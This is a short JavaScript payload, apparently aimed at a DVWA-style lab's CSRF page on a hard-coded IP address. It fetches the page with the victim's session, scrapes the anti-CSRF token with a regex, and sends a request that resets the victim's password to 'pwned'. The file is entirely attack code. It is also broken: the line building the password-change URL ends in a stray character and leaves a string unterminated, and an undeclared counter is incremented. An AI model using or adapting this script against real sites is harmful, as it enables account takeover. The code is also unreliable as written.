
var theUrl = 'http://34.133.46.89:9090/vulnerabilities/csrf/';
var pass = 'pwned';
if (window.XMLHttpRequest){
    xmlhttp=new XMLHttpRequest();
}else{
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}
xmlhttp.withCredentials = true;
var hacked = false;
xmlhttp.onreadystatechange=function(){
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        var token = match[1];
        var new_url = 'http://34.133.46.89:9090/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='>
        if(!hacked){
            alert('Got token:' + match[1]);
            hacked = true;
            xmlhttp.open("GET", new_url, false );
            xmlhttp.send();
        }
        count++;
    }
};
xmlhttp.open("GET", theUrl, false );
xmlhttp.send();
